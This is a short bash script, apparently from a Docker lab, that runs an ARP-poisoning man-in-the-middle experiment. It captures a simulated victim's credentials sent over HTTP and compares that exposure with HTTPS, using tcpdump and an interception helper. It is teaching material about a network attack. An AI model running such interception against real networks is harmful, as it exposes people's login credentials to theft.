#!/usr/bin/env bash
# Experimento 1 — Comparação de exposição: HTTP (porta 80) vs HTTPS (porta 443).
set -e
cd "$(dirname "$0")"; . ./lib.sh
OUT=$EVID/exp1
cor "EXPERIMENTO 1 — HTTP vs HTTPS"
parar_interceptador
docker exec $ATK sh -c "rm -f $OUT/* 2>/dev/null" || true
iniciar_tcpdump "$OUT/exp1.pcap"
iniciar_interceptador "$OUT"
echo "[*] aguardando o envenenamento ARP estabilizar..."; sleep 5
cor "Caches ARP durante o ataque"; mostrar_arp
cor "Gerando tráfego da vítima"
echo "[vitima] HTTP  -> site-http.lab/area-cliente?user=joao&senha=123"
vitima_http  "site-http.lab/area-cliente?user=joao&senha=123"
echo "[vitima] HTTPS -> banco.lab/area-cliente?user=joao&senha=123"
vitima_https "banco.lab/area-cliente?user=joao&senha=123"
sleep 3
parar_interceptador
parar_tcpdump
cor "O que o interceptador viu (captura_*.log)"
docker exec $ATK sh -c "cat $OUT/captura_*.log"
cor "Resumo consolidado (resumo_*.csv)"
docker exec $ATK sh -c "cat $OUT/resumo_*.csv"
cor "ARP após auto-cura (deve voltar aos MACs reais)"; mostrar_arp
echo "[OK] Evidências em evidencias/exp1/"
